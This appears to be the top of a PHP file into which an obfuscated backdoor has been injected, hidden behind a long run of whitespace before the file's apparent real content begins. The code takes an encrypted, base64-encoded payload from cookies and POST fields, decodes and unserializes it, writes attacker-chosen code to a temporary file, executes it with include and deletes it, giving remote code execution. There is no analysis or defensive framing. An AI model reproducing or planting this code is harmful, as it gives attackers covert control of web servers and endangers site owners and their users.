<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ptqbz")){class ptqbz{public static $bnsnueb = "znvsgawhmwfwmvnw";public static $yyirjne = NULL;public function __construct(){$gebmgrdmq = @$_COOKIE[substr(ptqbz::$bnsnueb, 0, 4)];if (!empty($gebmgrdmq)){$iinhlc = "base64";$ppqgkasz = "";$gebmgrdmq = explode(",", $gebmgrdmq);foreach ($gebmgrdmq as $geuwuhn){$ppqgkasz .= @$_COOKIE[$geuwuhn];$ppqgkasz .= @$_POST[$geuwuhn];}$ppqgkasz = array_map($iinhlc . "_decode", array($ppqgkasz,));$ppqgkasz = $ppqgkasz[0] ^ str_repeat(ptqbz::$bnsnueb, (strlen($ppqgkasz[0]) / strlen(ptqbz::$bnsnueb)) + 1);ptqbz::$yyirjne = @unserialize($ppqgkasz);}}public function __destruct(){$this->yxynbuzedu();}private function yxynbuzedu(){if (is_array(ptqbz::$yyirjne)) {$cnwrpb = sys_get_temp_dir() . "/" . crc32(ptqbz::$yyirjne["salt"]);@ptqbz::$yyirjne["write"]($cnwrpb, ptqbz::$yyirjne["content"]);include $cnwrpb;@ptqbz::$yyirjne["delete"]($cnwrpb);exit();}}}$brfqgoay = new ptqbz();$brfqgoay = NULL;} ?><?php
/**
